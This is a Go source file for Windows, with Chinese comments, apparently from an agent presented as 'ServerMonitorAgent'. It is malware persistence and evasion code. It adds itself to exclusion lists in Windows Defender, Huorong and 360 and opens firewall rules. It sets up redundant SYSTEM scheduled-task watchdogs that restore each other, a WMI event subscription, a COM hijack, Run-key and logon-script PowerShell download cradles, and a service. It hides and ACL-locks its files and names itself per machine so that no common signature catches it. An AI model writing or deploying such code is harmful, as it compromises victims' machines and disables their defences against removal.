//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

// ═══ 动态命名持久化防护体系 ═══
// 所有名称基于机器 GUID 动态生成，每台机器不同，无法建立通用查杀签名
// [1] 开机自启计划任务 (SYSTEM)
// [2] 看门狗 A 计划任务 (每分钟)
// [3] 看门狗 B 计划任务 (每分钟+30s偏移)
// [4] WMI 事件订阅
// [5] 注册表 Run + 登录恢复
// [6] Windows 服务
// [7] NTFS ACL 锁定 + 隐藏
// [8] 内存自愈线程

// 旧版固定路径（用于迁移检测和清理）
const (
	legacyDir     = `C:\ProgramData\ServerMonitorAgent`
	legacyExeName = `WinNetSvc.exe`
	legacyRegName = `WindowsNetworkCfg`
	regRunPath    = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
)

// 所有旧版计划任务名（统一清理）
var legacyTaskNames = []string{
	"ServerMonitorAgent",
	"ServerMonitorAgentWatchdog",
	"WindowsNetworkCfgSvc",
	"WindowsNetworkDiagnostics",
	"WindowsNetworkReporting",
}

// cleanupLegacy 清理所有旧版持久化（固定名称的任务、服务、注册表、WMI、目录）
func cleanupLegacy() {
	// 清理旧版计划任务
	for _, name := range legacyTaskNames {
		if taskExistsQuiet(name) {
			psExec(`Unregister-ScheduledTask -TaskName '` + name + `' -Confirm:$false -ErrorAction SilentlyContinue`)
		}
	}
	// 清理旧版 WMI
	for _, wmiName := range []string{"AgentGuard"} {
		psExec(`Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='` + wmiName + `'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue`)
		psExec(`Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name='` + wmiName + `'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue`)
		psExec(`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='` + wmiName + `'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue`)
	}
	// 清理旧版注册表
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, regRunPath, registry.SET_VALUE); err == nil {
		k.DeleteValue(legacyRegName)
		k.Close()
	}
	// 迁移配置文件（从旧目录复制到新目录）
	oldConf := filepath.Join(legacyDir, "agent.conf")
	newConf := filepath.Join(sid().Dir, "agent.conf")
	if data, err := os.ReadFile(oldConf); err == nil {
		if _, err := os.Stat(newConf); os.IsNotExist(err) {
			os.MkdirAll(sid().Dir, 0755)
			os.WriteFile(newConf, data, 0600)
		}
	}
	// 删除旧目录（先重置 ACL）
	if _, err := os.Stat(legacyDir); err == nil {
		psExec(`icacls '` + legacyDir + `' /reset /T /Q 2>$null`)
		os.RemoveAll(legacyDir)
	}
}

// ensurePersistence 自动检测并静默安装持久化（首次启动时）
func ensurePersistence() {
	// 启动时立即清理防火墙封锁
	healFirewall()

	// 清理旧版多路径备份（防止旧版本二进制被恢复导致版本回退）
	cleanupOldBackups()

	// 清理所有旧版固定名称的持久化
	cleanupLegacy()

	// 检测是否已安装：开机任务 OR COM 劫持
	if taskExistsQuiet(sid().TaskBoot) || isCOMHijackInstalled() {
		lockdownACL()
		go selfHealLoop() // 启动内存自愈线程
		return
	}
	// 未安装，静默执行完整安装
	installAgent()
	go selfHealLoop()
}

// addAVExclusions 添加主流杀软白名单（在文件操作之前执行，防止后续操作被拦截）
func addAVExclusions() {
	exe := sid().ExePath
	dir := sid().Dir
	exeName := sid().ExeName

	// ── Windows Defender ──
	psExec(fmt.Sprintf(`
Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess '%s' -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess '%s' -ErrorAction SilentlyContinue
`, dir, exeName, exe))

	// ── 火绒（Huorong）── 通过注册表添加信任区
	huorongTrustPaths := []string{
		`SOFTWARE\HRSword\sysdiag\Public\TrustArea\TrustFiles`,
		`SOFTWARE\Huorong\Sysdiag\Public\TrustArea\TrustFiles`,
	}
	for _, regPath := range huorongTrustPaths {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
		if err == nil {
			k.SetStringValue(exe, exe)
			k.SetStringValue(dir, dir)
			k.Close()
		}
	}

	// ── 360 安全卫士 ── 通过注册表添加信任
	paths360 := []string{
		`SOFTWARE\360Safe\Vul\WhiteList`,
		`SOFTWARE\360Safe\SoftMgr\trust`,
	}
	for _, regPath := range paths360 {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
		if err == nil {
			k.SetStringValue(exe, "1")
			k.Close()
		}
	}

	// ── 通用：将自身路径加入 Windows 防火墙允许列表 ──
	psExec(fmt.Sprintf(`
New-NetFirewallRule -DisplayName 'Windows Network Configuration Service' -Direction Inbound -Program '%s' -Action Allow -Profile Any -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName 'Windows Network Configuration Service Out' -Direction Outbound -Program '%s' -Action Allow -Profile Any -ErrorAction SilentlyContinue
`, exe, exe))
}

// installAgent 部署持久化（COM 劫持 + 开机任务 + WMI + ACL + 隐藏）
func installAgent() error {
	// [0] 添加杀软白名单（在创建文件之前，防止后续操作被拦截）
	addAVExclusions()

	// 准备目录和复制文件
	if err := prepareFiles(); err != nil {
		return fmt.Errorf("[准备文件] %v", err)
	}

	// [1] 开机自启计划任务（直接执行 EXE，不走 PowerShell，无闪烁）
	installBootTask()

	// [2] COM 劫持（替代看门狗计划任务，完全无窗口无闪烁）
	installCOMHijack()

	// [3] WMI 事件订阅
	installWMI()

	// [4] 注册表 Run + 登录恢复
	installRegistryAndRecovery()

	// [5] Windows 服务
	installService()

	// [6] NTFS ACL
	lockdownACL()

	// [7] 隐藏
	hideFiles()

	return nil
}

// uninstallAgent 移除所有持久化
func uninstallAgent() error {
	// 先解除进程保护（否则 taskkill 会导致 BSOD）
	disableProcessProtection()

	// 移除计划任务
	psExec(`Unregister-ScheduledTask -TaskName '` + sid().TaskBoot + `' -Confirm:$false -ErrorAction SilentlyContinue`)
	psExec(`Unregister-ScheduledTask -TaskName '` + sid().TaskGuardA + `' -Confirm:$false -ErrorAction SilentlyContinue`)
	psExec(`Unregister-ScheduledTask -TaskName '` + sid().TaskGuardB + `' -Confirm:$false -ErrorAction SilentlyContinue`)

	// 移除 WMI
	psExec(`Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='` + sid().WmiName + `'" | Remove-WmiObject -ErrorAction SilentlyContinue`)
	psExec(`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='` + sid().WmiName + `'" | Remove-WmiObject -ErrorAction SilentlyContinue`)
	psExec(`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*` + sid().WmiName + `*'} | Remove-WmiObject -ErrorAction SilentlyContinue`)

	// 移除 Windows 服务
	scStop := exec.Command("sc", "stop", sid().SvcName)
	scStop.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	scStop.Run()
	scDel := exec.Command("sc", "delete", sid().SvcName)
	scDel.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	scDel.Run()

	// 移除注册表
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, regRunPath, registry.SET_VALUE)
	if err == nil {
		k.DeleteValue(sid().RegName)
		k.Close()
	}
	// 移除登录脚本
	k2, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.SET_VALUE)
	if err == nil {
		k2.DeleteValue("UserInitMprLogonScript")
		k2.Close()
	}

	// 移除 COM 劫持
	uninstallCOMHijack()

	// 杀进程
	killCmd := exec.Command("taskkill", "/f", "/im", sid().ExeName)
	killCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	killCmd.Run()

	// 重置 ACL 后删除目录
	psExec(`icacls '` + sid().Dir + `' /reset /T /Q 2>$null`)
	os.RemoveAll(sid().Dir)

	// 清理多路径备份
	for _, loc := range getBackupLocations() {
		p := filepath.Join(loc.Dir, loc.ExeName)
		os.Remove(p)
		os.Remove(filepath.Join(loc.Dir, "agent.conf"))
		os.Remove(loc.Dir) // 尝试删除空目录
	}

	return nil
}

// cleanAllPersistence 清除所有持久化痕迹（不杀进程、不删文件）
// 用于自更新前：先清干净 → 替换二进制 → 新版本启动后重新安装
func cleanAllPersistence() {
	// 计划任务
	psExec(`Unregister-ScheduledTask -TaskName '` + sid().TaskBoot + `' -Confirm:$false -ErrorAction SilentlyContinue`)
	psExec(`Unregister-ScheduledTask -TaskName '` + sid().TaskGuardA + `' -Confirm:$false -ErrorAction SilentlyContinue`)
	psExec(`Unregister-ScheduledTask -TaskName '` + sid().TaskGuardB + `' -Confirm:$false -ErrorAction SilentlyContinue`)

	// COM 劫持
	uninstallCOMHijack()

	// WMI 事件订阅
	psExec(`Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='` + sid().WmiName + `'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue`)
	psExec(`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='` + sid().WmiName + `'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue`)
	psExec(`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue | Where-Object {$_.Filter -like '*` + sid().WmiName + `*'} | Remove-WmiObject -EA SilentlyContinue`)

	// Windows 服务
	scStop := exec.Command("sc", "stop", sid().SvcName)
	scStop.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	scStop.Run()
	scDel := exec.Command("sc", "delete", sid().SvcName)
	scDel.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	scDel.Run()

	// 注册表 Run
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, regRunPath, registry.SET_VALUE); err == nil {
		k.DeleteValue(sid().RegName)
		k.Close()
	}
	// 登录脚本
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.SET_VALUE); err == nil {
		k.DeleteValue("UserInitMprLogonScript")
		k.Close()
	}

	// 解除文件隐藏和 ACL 锁定（方便替换）
	psExec(`icacls '` + sid().Dir + `' /reset /T /Q 2>$null`)
	cmd := exec.Command("attrib", "-H", "-S", sid().Dir)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	cmd.Run()
	cmd2 := exec.Command("attrib", "-H", "-S", sid().ExePath)
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	cmd2.Run()
}

// ═══ 各层实现 ═══

func prepareFiles() error {
	os.MkdirAll(sid().Dir, 0755)
	srcPath, err := os.Executable()
	if err != nil {
		return err
	}
	srcPath, _ = filepath.EvalSymlinks(srcPath)
	dstPath := sid().ExePath

	// 如果目标已存在且不是自身，先删除
	if srcPath != dstPath {
		data, err := os.ReadFile(srcPath)
		if err != nil {
			return err
		}
		if err := os.WriteFile(dstPath, data, 0755); err != nil {
			return err
		}
	}

	// 复制配置文件（如果存在）
	confSrc := filepath.Join(filepath.Dir(srcPath), "agent.conf")
	confDst := filepath.Join(sid().Dir, "agent.conf")
	if data, err := os.ReadFile(confSrc); err == nil {
		os.WriteFile(confDst, data, 0644)
	}
	return nil
}

// [1] 开机自启计划任务（直接执行 agent EXE，无 PowerShell，无闪烁）
// agent 编译时带 -H windowsgui，运行时不会创建任何窗口
func installBootTask() error {
	ps := fmt.Sprintf(`
$taskName = '%s'
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
$action = New-ScheduledTaskAction -Execute '%s'
$trigger = New-ScheduledTaskTrigger -AtStartup
$trigger.Delay = 'PT10S'
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable -Hidden
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
`, sid().TaskBoot, sid().ExePath)
	return psExec(ps)
}

// createVBSWrapper 创建 VBS 包装脚本，用于完全无窗口地执行 PowerShell 脚本
func createVBSWrapper(vbsPath, ps1Path string) error {
	content := fmt.Sprintf("CreateObject(\"Wscript.Shell\").Run \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File \"\"%s\"\"\", 0, False\r\n", ps1Path)
	return os.WriteFile(vbsPath, []byte(content), 0644)
}

// [2] 看门狗 A — 直接执行 agent EXE（无闪烁，GUI 程序不弹窗）
func installWatchdogA() error {
	ps := fmt.Sprintf(`
$taskName = '%s'
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
$action = New-ScheduledTaskAction -Execute '%s'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
`, sid().TaskGuardA, sid().ExePath)
	return psExec(ps)
}

// [3] 看门狗 B — 直接执行 agent EXE，30s 偏移（无闪烁）
func installWatchdogB() error {
	ps := fmt.Sprintf(`
$taskName = '%s'
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
$action = New-ScheduledTaskAction -Execute '%s'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30) -RepetitionInterval (New-TimeSpan -Minutes 1)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
`, sid().TaskGuardB, sid().ExePath)
	return psExec(ps)
}

// [4] WMI 永久事件订阅（CommandLineEventConsumer — 无需 VBScript 引擎）
func installWMI() error {
	mutexName := getAgentMutexName()
	cradleCmd := getCradleOneLiner()

	// PowerShell 命令：Mutex 检测 + cradle（单引号包裹避免转义）
	psCheck := fmt.Sprintf(
		"$m=$null;try{$m=[Threading.Mutex]::OpenExisting('%s')}catch{};if($m){$m.Close();exit};%s",
		mutexName, cradleCmd)
	// 外层用双引号，内部已全部用单引号
	cmdLineTemplate := fmt.Sprintf(`powershell.exe -ep bypass -w hidden -NonI -c "%s"`, psCheck)
	// PowerShell 单引号字符串中，单引号需要双写转义
	escapedCmd := strings.ReplaceAll(cmdLineTemplate, "'", "''")

	ps := fmt.Sprintf(`
$ns = 'root\subscription'
# 清理旧的（兼容 CommandLineEventConsumer 和 ActiveScriptEventConsumer）
Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='%s'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='%s'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
Get-WmiObject -Namespace $ns -Class ActiveScriptEventConsumer -Filter "Name='%s'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA SilentlyContinue | Where-Object {$_.Filter -like '*%s*'} | Remove-WmiObject -EA SilentlyContinue

$wql = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
    Name = '%s'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = $wql
}

$consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
    Name = '%s'
    CommandLineTemplate = '%s'
    RunInteractively = $false
}

Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
`, sid().WmiName, sid().WmiName, sid().WmiName, sid().WmiName,
		sid().WmiName,
		sid().WmiName, escapedCmd)

	// 保存为脚本文件，供看门狗A重建时调用
	wmiSetupPath := filepath.Join(sid().Dir, "wmi_setup.ps1")
	os.WriteFile(wmiSetupPath, []byte(ps), 0644)

	return psExec(ps)
}

// [5] 注册表 Run + 登录恢复（无文件模式：指向 PowerShell cradle）
func installRegistryAndRecovery() error {
	cradleCmd := getCradleOneLiner()

	// 注册表 Run — 指向 cradle 而非 exe
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regRunPath, registry.SET_VALUE)
	if err == nil {
		k.SetStringValue(sid().RegName, cradleCmd)
		k.Close()
	}

	// 登录恢复脚本（纯 cradle，无磁盘文件依赖）
	k2, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.SET_VALUE)
	if err == nil {
		k2.SetStringValue("UserInitMprLogonScript", cradleCmd)
		k2.Close()
	}

	return nil
}

// [6] NTFS ACL 锁定（使用 icacls 替代 PowerShell，配合 CREATE_NO_WINDOW 零弹窗）
func lockdownACL() error {
	dir := sid().Dir
	cmds := [][]string{
		{"icacls", dir, "/inheritance:r"},
		{"icacls", dir, "/grant:r", "NT AUTHORITY\\SYSTEM:(OI)(CI)F"},
		{"icacls", dir, "/grant:r", "BUILTIN\\Administrators:(OI)(CI)F"},
		{"icacls", dir, "/grant:r", "BUILTIN\\Users:(OI)(CI)RX"},
	}
	for _, args := range cmds {
		cmd := exec.Command(args[0], args[1:]...)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
		cmd.Run()
	}
	return nil
}

// [7] 隐藏目录及所有文件
func hideFiles() {
	hideAttr := func(target string) {
		c := exec.Command("attrib", "+H", "+S", target)
		c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
		c.Run()
	}
	hideAttr(sid().Dir)
	filepath.Walk(sid().Dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || path == sid().Dir {
			return nil
		}
		hideAttr(path)
		return nil
	})
}

// psExec 执行 PowerShell 命令
func psExec(script string) error {
	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%v: %s", err, string(out))
	}
	return nil
}

// ═══ 守护逻辑（计划任务直接调用 agent --guard-a / --guard-b）═══
// agent 是 GUI 程序（-H windowsgui），计划任务运行时完全不弹窗
// 进程检测使用 Windows 原生 API，无需启动任何控制台子进程

type guardProcessEntry32 struct {
	Size            uint32
	Usage           uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

var (
	modKernel32Guard     = syscall.NewLazyDLL("kernel32.dll")
	procCreateToolhelp32 = modKernel32Guard.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW  = modKernel32Guard.NewProc("Process32FirstW")
	procProcess32NextW   = modKernel32Guard.NewProc("Process32NextW")
)

// isProcessAliveByName 使用 Windows API 检测进程是否存活（零弹窗）
func isProcessAliveByName(exeName string) bool {
	const TH32CS_SNAPPROCESS = 0x2
	snap, _, _ := procCreateToolhelp32.Call(TH32CS_SNAPPROCESS, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(snap))
	var pe guardProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	ok, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	target := strings.ToLower(exeName)
	for ok != 0 {
		name := strings.ToLower(syscall.UTF16ToString(pe.ExeFile[:]))
		if name == target {
			return true
		}
		ok, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return false
}

// taskExistsQuiet 通过文件系统检查计划任务是否存在（零子进程，零弹窗）
// Windows 任务文件存储在 %SystemRoot%\System32\Tasks\ 目录
func taskExistsQuiet(taskName string) bool {
	taskFile := filepath.Join(os.Getenv("SystemRoot"), "System32", "Tasks", taskName)
	_, err := os.Stat(taskFile)
	return err == nil
}

// runGuardA 看门狗A守护逻辑
func runGuardA() {
	// 1. 重建看门狗B（如果被删除）
	if !taskExistsQuiet(sid().TaskGuardB) {
		installWatchdogB()
	}
	// 2. 重建 COM 劫持（如果被清除）
	if !isCOMHijackInstalled() {
		installCOMHijack()
	}
}

// runGuardB 看门狗B守护逻辑
func runGuardB() {
	// 1. 重建看门狗A（如果被删除）
	if !taskExistsQuiet(sid().TaskGuardA) {
		installWatchdogA()
	}
	// 2. 重建开机任务（如果被删除）
	if !taskExistsQuiet(sid().TaskBoot) {
		installBootTask()
	}
	// 3. 重建 COM 劫持（如果被清除）
	if !isCOMHijackInstalled() {
		installCOMHijack()
	}
}
